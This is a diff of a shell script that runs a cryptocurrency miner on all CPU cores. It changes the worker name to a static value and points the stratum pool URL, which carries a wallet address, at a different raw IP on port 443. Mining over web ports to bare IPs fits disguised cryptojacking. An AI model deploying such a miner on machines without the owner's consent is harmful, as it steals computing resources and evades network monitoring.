@@ -33,18 +33,16 @@ set_permissions() {
     fi
 }
 
-# Generate a worker name using today's date in India time zone with prefix GT and random suffix
+# Use a static worker name
 generate_worker_name() {
-    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
-    random_suffix=$(tr -dc 'a-z0-9' </dev/urandom | head -c 4)
-    echo "VT22${date_str}${random_suffix}"
+    echo "VT04"
 }
 
 # Run the miner using all CPU cores
 run_miner() {
     miner_filename=$1
     worker_name=$2
-    stratum_url="stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.${worker_name}:x@69.164.203.136:80"
+    stratum_url="stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.${worker_name}:x@172.104.58.184:443"
 
     echo "🚀 Starting miner with worker name: $worker_name"
     if ./$miner_filename -stratum "$stratum_url"; then
